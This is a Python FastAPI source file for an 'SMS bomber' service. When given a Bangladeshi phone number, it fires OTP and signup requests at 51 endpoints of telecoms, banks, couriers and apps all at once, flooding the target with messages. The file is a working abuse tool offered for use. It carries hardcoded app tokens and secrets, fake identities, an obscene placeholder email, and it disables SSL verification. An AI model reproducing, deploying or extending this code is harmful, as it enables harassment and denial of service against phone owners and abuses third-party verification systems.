# app.py — Sirf XBOX (51 APIs)
from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import uvicorn
import asyncio
import aiohttp
import time
import os
import re
import json

app = FastAPI(title="🔥 XBOX BOMBER API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================
# PHONE FORMATTER
# ============================================================

def format_phone(phone):
    cleaned = re.sub(r'\D', '', phone)
    if len(cleaned) == 11 and cleaned.startswith('01'):
        raw = cleaned[2:]
        with_0 = cleaned
        with_88 = f"88{raw}"
        with_880 = f"880{raw}"
        with_plus88 = f"+88{raw}"
        with_plus880 = f"+880{raw}"
    elif len(cleaned) == 10:
        raw = cleaned
        with_0 = f"0{cleaned}"
        with_88 = f"88{cleaned}"
        with_880 = f"880{cleaned}"
        with_plus88 = f"+88{cleaned}"
        with_plus880 = f"+880{cleaned}"
    else:
        raw = cleaned[-10:] if len(cleaned) > 10 else cleaned
        with_0 = f"0{raw}"
        with_88 = f"88{raw}"
        with_880 = f"880{raw}"
        with_plus88 = f"+88{raw}"
        with_plus880 = f"+880{raw}"
    return {
        'raw': raw,
        'with_0': with_0,
        'with_88': with_88,
        'with_880': with_880,
        'with_plus88': with_plus88,
        'with_plus880': with_plus880
    }

# ============================================================
# XBOX APIS (51)
# ============================================================

APIS = [
    {"name": "RIZER Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "data": lambda p: json.dumps({"full_name": "Johny Singh", "company_name": "lmnxlija", "email_address": "lmnxlija9689@gmail.com", "phone_number": p['with_0']}), "type": "sms"},
    {"name": "RIZER Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "data": lambda p: json.dumps({"mobile_no": p['with_0']}), "type": "sms"},
    {"name": "RIZER Doctime", "method": "POST", "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "data": lambda p: json.dumps({"data": {"country_calling_code": "88", "contact_no": p['with_0'], "headers": {"PlatForm": "Web"}}}), "type": "sms"},
    {"name": "RIZER Sundarban", "method": "POST", "url": "https://api-gateway.sundarbancourierltd.com/graphql", "data": lambda p: json.dumps({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": p['with_0']}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}), "type": "sms"},
    {"name": "RIZER Apex4U", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "data": lambda p: json.dumps({"phoneNumber": p['with_0']}), "type": "sms"},
    {"name": "RIZER Robi Doorstep", "method": "POST", "url": "https://webapi.robi.com.bd/v1/send-otp", "data": lambda p: json.dumps({"phone_number": p['with_0'], "type": "doorstep"}), "type": "sms"},
    {"name": "RIZER Banglalink Validate", "method": "GET", "url": "https://web-api.banglalink.net/api/v1/user/number/validation/{phone}", "type": "sms", "key": "with_0"},
    {"name": "RIZER Banglalink OTP", "method": "POST", "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request", "data": lambda p: json.dumps({"mobile": p['with_0']}), "type": "sms"},
    {"name": "RIZER GP Web Login", "method": "POST", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "data": lambda p: f"msisdn={p['with_0']}", "type": "sms"},
    {"name": "RIZER Robi MyOffer", "method": "POST", "url": "https://webapi.robi.com.bd/v1/send-otp", "data": lambda p: json.dumps({"phone_number": p['with_0'], "type": "my_offer"}), "type": "sms"},
    {"name": "RIZER Robi DA", "method": "POST", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "data": lambda p: json.dumps({"msisdn": p['with_0']}), "type": "sms"},
    {"name": "RIZER Robi Video Chat", "method": "POST", "url": "https://webapi.robi.com.bd/v1/chat/send-otp", "data": lambda p: json.dumps({"phone_number": p['with_0'], "name": "Johny Singh", "type": "video-chat"}), "type": "sms"},
    {"name": "RIZER RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "data": lambda p: json.dumps({"phoneNumber": p['with_0']}), "type": "sms"},
    {"name": "RIZER Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "data": lambda p: json.dumps({"msisdn": p['with_0']}), "type": "sms"},
    {"name": "RIZER Bikroy", "method": "GET", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "type": "sms", "key": "with_0"},
    {"name": "RIZER Motionview", "method": "POST", "url": "https://api.motionview.com.bd/api/send-otp-phone-signup", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "RIZER Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"number": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "RIZER Jatri", "method": "POST", "url": "https://user-api.jslglobal.co:444/v2/send-otp", "data": lambda p: json.dumps({"phone": f"+88{p['raw']}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}), "type": "sms"},
    {"name": "RIZER Chinaonline", "method": "GET", "url": "https://chinaonlinebd.com/api/login/getOtp?phone={phone}", "type": "sms", "key": "with_0"},
    {"name": "RIZER Deepto", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "data": lambda p: json.dumps({"number": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "RIZER Shikho", "method": "POST", "url": "https://api.shikho.com/auth/v2/send/sms", "data": lambda p: json.dumps({"phone": p['with_0'], "type": "student", "auth_type": "signup", "vendor": "shikho"}), "type": "sms"},
    {"name": "RIZER RedX Signup", "method": "POST", "url": "https://api.redx.com.bd/v1/user/signup", "data": lambda p: json.dumps({"name": "961096106", "phoneNumber": p['with_0'], "service": "redx"}), "type": "sms"},
    {"name": "RIZER Bioscope Live", "method": "POST", "url": "https://www.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp", "type": "sms", "key": "raw"},
    {"name": "RIZER Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login{phone}", "type": "sms", "key": "with_0"},
    {"name": "RIZER AppLink", "method": "POST", "url": "https://applink.com.bd/appstore-v4-server/login/otp/request", "data": lambda p: json.dumps({"msisdn": f"88{p['raw']}"}), "type": "sms"},
    {"name": "RIZER Chokrojan", "method": "POST", "url": "https://chokrojan.com/api/v1/passenger/login/mobile", "data": lambda p: json.dumps({"mobile_number": p['with_0']}), "type": "sms"},
    {"name": "RIZER Dhaka Bank", "method": "POST", "url": "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", "data": lambda p: json.dumps({"AccessToken": "", "TrackingNo": "", "mobileNo": p['with_0'], "otpSms": "", "product_id": "250", "requestChannel": "MOB", "trackingStatus": 5}), "type": "sms"},
    {"name": "RIZER Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "data": lambda p: json.dumps({"name": "Limon Islam", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": p['with_0'], "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}), "type": "sms"},
    {"name": "RIZER Banglalink Eshop", "method": "POST", "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "data": lambda p: json.dumps({"type": "phone", "phone": p['with_0']}), "type": "sms"},
    {"name": "RIZER FSIBL", "method": "POST", "url": "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", "data": lambda p: json.dumps({"AccessToken": "", "TrackingNo": "", "mobileNo": p['with_0'], "otpSms": "", "product_id": "122", "requestChannel": "MOB", "trackingStatus": 5}), "type": "sms"},
    {"name": "RIZER MyGP Cinematic", "method": "POST", "url": "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D", "data": lambda p: json.dumps({"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}), "type": "sms", "key": "raw"},
    {"name": "RIZER GP FWA", "method": "POST", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "data": lambda p: json.dumps({"phone": p['with_0'], "email": "", "language": "en"}), "type": "sms"},
    {"name": "RIZER Hishabee", "method": "POST", "url": "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone}", "type": "sms", "key": "with_0"},
    {"name": "RIZER Iqra", "method": "GET", "url": "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", "type": "sms", "key": "with_0"},
    {"name": "RIZER Robi Smart", "method": "POST", "url": "https://smart1216.robi.com.bd/robi_sivr/public/login/phone", "data": lambda p: json.dumps({"cli": p['raw']}), "type": "sms"},
    {"name": "RIZER Jatri v1", "method": "POST", "url": "https://user-api.jslglobal.co:444/v1/send-otp", "data": lambda p: json.dumps({"phone": f"+88{p['raw']}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}), "type": "sms"},
    {"name": "RIZER MCB Affiliate", "method": "POST", "url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP", "data": lambda p: f"PhoneNumber={p['with_0']}", "type": "sms"},
    {"name": "RIZER MithaiBD", "method": "POST", "url": "https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT", "data": lambda p: json.dumps({"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": f"fuckyoubro{p['with_0']}@gmail.com", "g_id": "", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": p['with_0'], "storefront_id": "5"}), "type": "sms"},
    {"name": "RIZER EnglishMojabd", "method": "POST", "url": "https://api.englishmojabd.com/api/v1/auth/login", "data": lambda p: json.dumps({"phone": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "RIZER Moveon", "method": "POST", "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "RIZER OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": lambda p: json.dumps({"mobile": f"+88-{p['raw']}", "deviceToken": "app", "language": "bn", "os": "android"}), "type": "sms"},
    {"name": "RIZER MyGP OTP", "method": "GET", "url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0", "type": "sms", "key": "raw"},
    {"name": "RIZER Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "data": lambda p: json.dumps({"mobileNumber": f"+88{p['raw']}"}), "type": "sms"},
    {"name": "RIZER Reseller Circle", "method": "POST", "url": "https://reseller.circle.com.bd/api/v2/auth/signup", "data": lambda p: json.dumps({"name": f"+88{p['raw']}", "email_or_phone": f"+88{p['raw']}", "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}), "type": "sms"},
    {"name": "RIZER Shomvob", "method": "POST", "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", "data": lambda p: json.dumps({"phone": p['with_0']}), "type": "sms"},
    {"name": "RIZER Toybox", "method": "POST", "url": "https://api.toybox.live/bdapps_handler.php", "data": lambda p: json.dumps({"Operation": "CreateSubscription", "MobileNumber": f"88{p['raw']}", "PackageID": 100, "Secret": "HJKX71%UHYH"}), "type": "sms"},
    {"name": "RIZER Win2Gain", "method": "GET", "url": "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{phone}", "type": "sms", "key": "raw"},
    {"name": "RIZER BD Kepler", "method": "POST", "url": "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", "data": lambda p: json.dumps({"deviceId": "7dtdhid45c0f0901", "deviceInfo": {"deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA", "deviceId": "7d8b0agi0g0f0901", "firebaseDeviceToken": "", "manufacturer": "MI", "modelName": "NOTE 10", "osFirmWireBuild": "", "osName": "Android", "osVersion": "10", "rootDevice": 0}, "operator": "Gp", "walletNumber": p['with_0']}), "type": "sms"},
    {"name": "RIZER Roots Edu Register", "method": "POST", "url": "https://rootsedulive.com/api/auth/register", "data": lambda p: f"name=Pagli+Khatun&phone=88{p['raw']}&email=subap{p['raw']}agli2023@gmail.com&password=iDSnWh6rzp9KNAY&confirmPassword=iDSnWh6rzp9KNAY", "type": "sms"},
    {"name": "RIZER Roots Edu Forget", "method": "POST", "url": "https://rootsedulive.com/api/auth/forget-password", "data": lambda p: f"phoneOrEmail=88{p['raw']}", "type": "sms"},
    {"name": "RIZER MyGP Cinematic Common", "method": "POST", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", "type": "sms", "key": "raw"},
]

# ============================================================
# BOMBER ENGINE
# ============================================================

async def fire_api(session, api, phone_data):
    try:
        key = api.get("key", "with_0")
        url = api["url"].replace("{phone}", phone_data[key])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        
        if api["method"] == "POST":
            data = api.get("data")
            if data:
                if callable(data):
                    data_str = data(phone_data)
                else:
                    data_str = data
            else:
                data_str = None
            
            if data_str:
                if isinstance(data_str, dict):
                    async with session.post(url, headers=headers, json=data_str, timeout=5, ssl=False) as resp:
                        if 200 <= resp.status < 400:
                            return True
                else:
                    async with session.post(url, headers=headers, data=data_str, timeout=5, ssl=False) as resp:
                        if 200 <= resp.status < 400:
                            return True
            else:
                async with session.post(url, headers=headers, timeout=5, ssl=False) as resp:
                    if 200 <= resp.status < 400:
                        return True
        else:
            async with session.get(url, headers=headers, timeout=5, ssl=False) as resp:
                if 200 <= resp.status < 400:
                    return True
    except:
        pass
    return False

async def run_bomb(phone_data):
    success = 0
    total = len(APIS)
    
    async with aiohttp.ClientSession() as session:
        tasks = [fire_api(session, api, phone_data) for api in APIS]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r)
    
    return {
        "target": phone_data['with_0'],
        "total_apis": total,
        "success": success,
        "failed": total - success
    }

# ============================================================
# ENDPOINTS
# ============================================================

@app.get("/")
async def root():
    return {
        "status": "🔥 XBOX BOMBER API (51 APIs)",
        "owner": "@felix_bhai",
        "total_apis": len(APIS),
        "usage": "/bomb?phone=017XXXXXXXX"
    }

@app.get("/bomb")
async def bomb(phone: str = Query(..., description="11-digit BD phone number")):
    phone_data = format_phone(phone)
    
    if not phone_data['with_0'].startswith('01') or len(phone_data['with_0']) != 11:
        return JSONResponse({
            "success": False,
            "owner": "@felix_bhai",
            "message": "Invalid BD phone number! Must be 11 digits starting with 01"
        }, status_code=400)
    
    result = await run_bomb(phone_data)
    
    return JSONResponse({
        "success": True,
        "owner": "@felix_bhai",
        **result,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    })

@app.get("/apis")
async def list_apis():
    return {
        "total": len(APIS),
        "apis": [{"name": a["name"], "method": a["method"], "type": a.get("type", "sms")} for a in APIS]
    }

# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print("=" * 60)
    print("🔥 XBOX BOMBER API STARTED 🔥")
    print(f"📡 Total APIs: {len(APIS)}")
    print(f"👤 Owner: @felix_bhai")
    print(f"🌐 Port: {port}")
    print("=" * 60)
    uvicorn.run(app, host="0.0.0.0", port=port)
